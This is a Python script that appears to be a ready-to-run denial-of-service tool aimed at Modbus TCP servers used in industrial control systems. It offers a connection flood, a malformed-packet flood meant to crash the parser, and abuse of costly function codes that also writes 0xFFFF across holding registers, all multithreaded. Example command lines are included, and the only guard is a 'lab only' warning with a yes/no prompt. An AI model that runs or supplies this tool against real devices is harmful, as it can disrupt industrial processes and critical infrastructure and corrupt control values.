from pyModbusTCP.client import ModbusClient
import socket
import struct
import threading
import time
import logging
import argparse
import random

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')


class ModbusDoS:
    def __init__(self, target_host, target_port, attack_type='flood', threads=50, duration=60):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_type = attack_type
        self.threads = threads
        self.duration = duration
        self.running = False
        self.stats = {'connections': 0, 'packets': 0, 'errors': 0}

    def connection_flood(self):
        """Flood target with TCP connections without closing them"""
        sockets = []
        logging.info(f'[FLOOD] Starting connection flood against {self.target_host}:{self.target_port}')
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_host, self.target_port))
                sockets.append(sock)
                self.stats['connections'] += 1
                
                if len(sockets) % 10 == 0:
                    logging.info(f'[FLOOD] Open connections: {len(sockets)}')
                
                time.sleep(0.01)
                
            except Exception as e:
                self.stats['errors'] += 1
                if self.stats['errors'] % 100 == 0:
                    logging.warning(f'[FLOOD] Connection errors: {self.stats["errors"]}')
                time.sleep(0.1)
        
        logging.info(f'[FLOOD] Cleaning up {len(sockets)} connections...')
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

    def malformed_packet_flood(self):
        """Send malformed Modbus packets to crash/confuse server"""
        logging.info(f'[MALFORMED] Starting malformed packet flood against {self.target_host}:{self.target_port}')
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_host, self.target_port))
                
                malformed_packets = [
                    b'\x00\x00\x00\x00\x00\x00',
                    b'\xff\xff\xff\xff\xff\xff\xff\xff',
                    b'\x00\x01\x00\x00\x00\xff\x01\x03\x00\x00\xff\xff',
                    struct.pack('>HHHBB', 0, 0, 256, 1, 99),
                    struct.pack('>HHHBB', 0, 0, 0, 1, 3),
                    b'\x00' * random.randint(1000, 5000),
                    struct.pack('>HHHBBHH', 0, 0, 6, 1, 3, 0xFFFF, 0xFFFF),
                ]
                
                for packet in malformed_packets:
                    sock.send(packet)
                    self.stats['packets'] += 1
                
                sock.close()
                
                if self.stats['packets'] % 100 == 0:
                    logging.info(f'[MALFORMED] Packets sent: {self.stats["packets"]}')
                
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.01)

    def function_code_abuse(self):
        """Abuse expensive Modbus function codes to exhaust server resources"""
        logging.info(f'[ABUSE] Starting function code abuse against {self.target_host}:{self.target_port}')
        
        while self.running:
            try:
                client = ModbusClient(host=self.target_host, port=self.target_port, 
                                    timeout=1, auto_open=True, auto_close=True)
                
                if client.open():
                    client.read_holding_registers(0, 125)
                    client.read_input_registers(0, 125)
                    client.read_coils(0, 2000)
                    client.read_discrete_inputs(0, 2000)
                    client.write_multiple_registers(0, [0xFFFF] * 123)
                    
                    self.stats['packets'] += 5
                    
                    if self.stats['packets'] % 50 == 0:
                        logging.info(f'[ABUSE] Operations sent: {self.stats["packets"]}')
                
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.01)

    def start_attack(self):
        """Launch the attack with multiple threads"""
        self.running = True
        start_time = time.time()
        
        logging.warning(f'=== STARTING DoS ATTACK: {self.attack_type.upper()} ===')
        logging.warning(f'Target: {self.target_host}:{self.target_port}')
        logging.warning(f'Threads: {self.threads}')
        logging.warning(f'Duration: {self.duration}s')
        logging.warning('='*50)
        
        if self.attack_type == 'flood':
            attack_func = self.connection_flood
        elif self.attack_type == 'malformed':
            attack_func = self.malformed_packet_flood
        elif self.attack_type == 'abuse':
            attack_func = self.function_code_abuse
        elif self.attack_type == 'all':
            attack_funcs = [self.connection_flood, self.malformed_packet_flood, self.function_code_abuse]
            threads = []
            for i in range(self.threads):
                func = attack_funcs[i % len(attack_funcs)]
                t = threading.Thread(target=func, daemon=True)
                t.start()
                threads.append(t)
            
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                if elapsed % 10 == 0:
                    logging.info(f'Attack running... {elapsed}s elapsed | Connections: {self.stats["connections"]} | Packets: {self.stats["packets"]} | Errors: {self.stats["errors"]}')
            
            self.running = False
            logging.warning('=== ATTACK COMPLETED ===')
            logging.info(f'Final stats - Connections: {self.stats["connections"]} | Packets: {self.stats["packets"]} | Errors: {self.stats["errors"]}')
            return
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=attack_func, daemon=True)
            t.start()
            threads.append(t)
        
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                if elapsed % 10 == 0:
                    logging.info(f'Attack running... {elapsed}s elapsed | Connections: {self.stats["connections"]} | Packets: {self.stats["packets"]} | Errors: {self.stats["errors"]}')
        except KeyboardInterrupt:
            logging.warning('Attack interrupted by user')
        
        self.running = False
        
        logging.info('Stopping attack threads...')
        for t in threads:
            t.join(timeout=2)
        
        logging.warning('=== ATTACK COMPLETED ===')
        logging.info(f'Final stats - Connections: {self.stats["connections"]} | Packets: {self.stats["packets"]} | Errors: {self.stats["errors"]}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Modbus TCP DoS attack tool (USE ONLY IN LAB ENVIRONMENTS)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack types:
  flood       - TCP connection flooding (exhaust connection limits)
  malformed   - Malformed packet flooding (crash/confuse parser)
  abuse       - Function code abuse (exhaust CPU/memory)
  all         - Combined attack (most brutal)

Examples:
  python modbus_dos_attack.py --target 127.0.0.1 --attack flood --threads 100
  python modbus_dos_attack.py --target 192.168.1.10 --attack all --duration 30
        """
    )
    parser.add_argument('--target', required=True, help='Target Modbus server IP')
    parser.add_argument('--port', type=int, default=502, help='Target port (default: 502)')
    parser.add_argument('--attack', choices=['flood', 'malformed', 'abuse', 'all'], 
                       default='flood', help='Attack type')
    parser.add_argument('--threads', type=int, default=50, help='Number of attack threads')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    
    args = parser.parse_args()
    
    print('='*60)
    print('WARNING: This tool performs DoS attacks on Modbus servers.')
    print('USE ONLY in isolated lab environments you control.')
    print('='*60)
    response = input(f'Attack {args.target}:{args.port} with {args.attack}? (yes/no): ')
    
    if response.lower() != 'yes':
        print('Attack cancelled.')
        exit(0)
    
    attacker = ModbusDoS(
        target_host=args.target,
        target_port=args.port,
        attack_type=args.attack,
        threads=args.threads,
        duration=args.duration
    )
    
    attacker.start_attack()